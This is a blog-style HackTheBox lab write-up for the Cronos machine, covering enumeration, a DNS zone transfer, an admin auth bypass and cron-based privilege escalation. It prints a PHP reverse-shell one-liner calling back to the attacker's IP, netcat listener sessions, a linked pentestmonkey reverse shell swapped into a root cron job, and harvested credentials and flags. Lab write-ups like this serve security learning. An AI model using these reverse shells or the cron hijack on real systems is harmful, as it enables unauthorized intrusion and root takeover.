---
layout: post
title: "Cronos Writeup - HackTheBox"
category: HackTheBox
---



# HTB lab Machine - Cronos

I started of reverting the machine, and then ran my self made script https://github.com/yassirlaaouissi/EZEA. The exact results can be found in the results/10.129.30.241 folder that I have attached to this post.

## Enumeration summary

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)

53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.10.3-P4-Ubuntu

80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

```
php, pl, sh, asp, html, json, py, cfm, aspx, rb, cgi
/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
http://10.129.30.241
```

```
Summary   : PoweredBy[{], Script[text/javascript], Apache[2.4.18], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)]
```

Added cronos to hosts as cronos.htb and did another run of EZEA:

```
Summary   : Cookies[XSRF-TOKEN,laravel_session], HttpOnly[laravel_session], X-UA-Compatible[IE=edge], HTML5, Apache[2.4.18], Laravel, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)]

```

```
+ OSVDB-3092: /web.config: ASP config file is accessible.
```

```
    Set-Cookie: XSRF-TOKEN=eyJpdiI6IlwvQWhwdU9Fb3p1SEFGOEd0RE41VUZBPT0iLCJ2YWx1ZSI6Ik4zQjNOQkUzekRpQ3lGSlwvaUYrakk0VmxDRE13a2gwbFVISzJlUU1zQ24zUUdjK0drV0ViaHA4UmZoVzdpb2VoaUZCTzg3aEJUb0hQbVRMc1wvRWR0VXc9PSIsIm1hYyI6IjNlMTZiZGRkMTQ1NDdlNGZkMGQyNWViNWM4NTZlMjE5ZjU4ZGE0YjRlYTM1YzAyMTc0YmYxZDUwZjA0MmM4YjkifQ%3D%3D; expires=Thu, 03-Jun-2021 15:48:46 GMT; Max-Age=7200; path=/
    Set-Cookie: laravel_session=eyJpdiI6IlZ2cEFHYzFraXdiczR1UzFmXC9mZ1RnPT0iLCJ2YWx1ZSI6IjRiZHRoQXhYdnkza3BuZDZlMnd2d0RnTWxOZEJWV255YVZ6OEpxeTg0c1huTFFhdXQ0c3ZuQ3hFWnR3ekEyQURPZ1ZXOVJjXC93RlZWSitVMm1EdWx4dz09IiwibWFjIjoiOWExZTVmYzYyOTk2NGJkYTJkMWQ2ZDhlNTNlOWQ2YzI0YzIxMzNhZDQwNDM0OTMwZWNkNDAyNzk4Yzk0NmNlMSJ9; expires=Thu, 03-Jun-2021 15:48:46 GMT; Max-Age=7200; path=/; HttpOnly

```

```
┌──(kali㉿kali)-[~/Desktop/Self written scripts/EZEA]
└─$ dig ns cronos.htb @10.129.156.83

; <<>> DiG 9.16.15-Debian <<>> ns cronos.htb @10.129.156.83
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 49557
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 2

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;cronos.htb.            IN  NS

;; ANSWER SECTION:
cronos.htb.     604800  IN  NS  ns1.cronos.htb.

;; ADDITIONAL SECTION:
ns1.cronos.htb.     604800  IN  A   10.129.156.83

;; Query time: 20 msec
;; SERVER: 10.129.156.83#53(10.129.156.83)
;; WHEN: Thu Jun 03 14:50:11 EDT 2021
;; MSG SIZE  rcvd: 73

```

## Exploitation

Decided to do a DNS ZoneTransfer attack. And look what I found:

```
┌──(kali㉿kali)-[~/Desktop/Self written scripts/EZEA]
└─$ dig axfr @cronos.htb cronos.htb

; <<>> DiG 9.16.15-Debian <<>> axfr @cronos.htb cronos.htb
; (1 server found)
;; global options: +cmd
cronos.htb.     604800  IN  SOA cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
cronos.htb.     604800  IN  NS  ns1.cronos.htb.
cronos.htb.     604800  IN  A   10.129.156.83
admin.cronos.htb.   604800  IN  A   10.129.156.83
ns1.cronos.htb.     604800  IN  A   10.129.156.83
www.cronos.htb.     604800  IN  A   10.129.156.83
cronos.htb.     604800  IN  SOA cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
;; Query time: 12 msec
;; SERVER: 10.129.156.83#53(10.129.156.83)
;; WHEN: Thu Jun 03 14:53:55 EDT 2021
;; XFR size: 7 records (messages 1, bytes 203)

```

admin.cronos.htb is going to be added to /.etc/hosts. Ran another EZEA Scan over admin.cronos.htb. And here is a summary of the results:

```
[-] [admin.cronos.htb tcp/80/nikto] + /config.php: PHP Config file may contain database IDs and passwords.

```

You can bypass auth like this:

![image-20210603211704393.png](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/image-20210603211704393.png)

Which will bring you to this:

![image-20210603211759457.png](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/image-20210603211759457.png)

Well from here we can start a shell:

![image-20210603211844766.png](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/image-20210603211844766.png)

![image-20210603211910477.png](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/image-20210603211910477.png)

Used this as reverse shell oneliner:

```
php -r '$sock=fsockopen("10.10.14.34",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

Go to you listener:

```
┌──(kali㉿kali)-[~/Desktop/Self written scripts/EZEA]
└─$ nc -lvp 4444
listening on [any] 4444 ...
connect to [10.10.14.34] from cronos.htb [10.129.156.83] 46520
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ whoami
www-data
$ pwdf
/bin/sh: 3: pwdf: not found
$ pwd
/var/www/admin
$

```

```
$ cd /home
$ dir
noulis
$ cd noulis
$ dir
user.txt
$ cat user.txt
51d236438b333970dbba7dc3089be33b
$

```

Upgraded shell using this:

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

I have the user flag, but I can execute commands as noulis.

## Privesc

Lets first get to noulis using linpeas:

```
════════════════════════════════════╣ System Information ╠════════════════════════════════════
[+] Operative system
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits
Linux version 4.4.0-72-generic (buildd@lcy01-17) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #93-Ubuntu SMP Fri Mar 31 14:07:41 UTC 2017
Distributor ID: Ubuntu
Description:    Ubuntu 16.04.2 LTS
Release:    16.04
Codename:   xenial

[+] Sudo version
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version
Sudo version 1.8.16

```

```
[+] Useful software
/usr/bin/lxc
/bin/nc
/bin/netcat
/usr/bin/wget
/usr/bin/curl
/bin/ping
/usr/bin/base64
/usr/bin/python
/usr/bin/python2
/usr/bin/python3
/usr/bin/python2.7
/usr/bin/perl
/usr/bin/php
/usr/bin/sudo

```

```
[+] Installed Compiler
/usr/share/gcc-5

```

```
The following cronjob:

* * * * *   root    php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1

```

```
Possible private SSH keys were found!
/var/www/laravel/vendor/swiftmailer/swiftmailer/tests/_samples/smime/encrypt2.key
/var/www/laravel/vendor/swiftmailer/swiftmailer/tests/_samples/smime/intermediate.key
/var/www/laravel/vendor/swiftmailer/swiftmailer/tests/_samples/smime/ca.key
/var/www/laravel/vendor/swiftmailer/swiftmailer/tests/_samples/smime/sign2.key
/var/www/laravel/vendor/swiftmailer/swiftmailer/tests/_samples/smime/encrypt.key
/var/www/laravel/vendor/swiftmailer/swiftmailer/tests/_samples/smime/sign.key
/var/www/laravel/vendor/swiftmailer/swiftmailer/tests/_samples/dkim/dkim.test.priv

```

```
[+] Searching backup-manager files
backup-manager file: /var/www/laravel/config/database.php

```

```
Reading /var/www/laravel/.env
APP_NAME=Laravel
APP_ENV=local
APP_KEY=base64:+fUFGL45d1YZYlSTc0Sm71wPzJejQN/K6s9bHHihdYE=
APP_DEBUG=true
APP_LOG_LEVEL=debug
APP_URL=http://localhost

DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=homestead
DB_USERNAME=homestead
DB_PASSWORD=secret

BROADCAST_DRIVER=log
CACHE_DRIVER=file
SESSION_DRIVER=file
QUEUE_DRIVER=sync

REDIS_HOST=127.0.0.1
REDIS_PASSWORD=null
REDIS_PORT=6379

MAIL_DRIVER=smtp
MAIL_HOST=smtp.mailtrap.io
MAIL_PORT=2525
MAIL_USERNAME=null
MAIL_PASSWORD=null
MAIL_ENCRYPTION=null

```

```
[+] Searching passwords in config PHP files
   define('DB_DATABASE', 'admin');
   define('DB_PASSWORD', 'kEjdbRigfBHUREiNSDs');
   define('DB_USERNAME', 'admin');
            'password' => env('DB_PASSWORD', ''),
            'password' => env('REDIS_PASSWORD', null),
   define('DB_DATABASE', 'admin');
   define('DB_PASSWORD', 'kEjdbRigfBHUREiNSDs');
   define('DB_USERNAME', 'admin');
            'password' => env('DB_PASSWORD', ''),
            'password' => env('REDIS_PASSWORD', null),

```

I saw that cronjob:

```
* * * * *   root    php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
```

It runs a PHP file every minute that is owned by www-data. So we simply replace that php file with this: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php

Start a listener:

```
┌──(kali㉿kali)-[~/Desktop/DownloadedScripts]
└─$ nc -lvp 1234
listening on [any] 1234 ...
connect to [10.10.14.34] from cronos.htb [10.129.156.83] 44686
Linux cronos 4.4.0-72-generic #93-Ubuntu SMP Fri Mar 31 14:07:41 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 22:40:01 up 55 min,  0 users,  load average: 4.12, 4.86, 5.23
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=0(root) gid=0(root) groups=0(root)
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# pwd
/
# cd /root
# dir
dhcp.sh  root.txt
# whoami
root
# cat root.txt
1703b8a3c9a8dde879942c79d02fd3a0
#

```

## Final thoughts

Nice 20 pointer. Learned some new stuff about DNS Zone transfer.
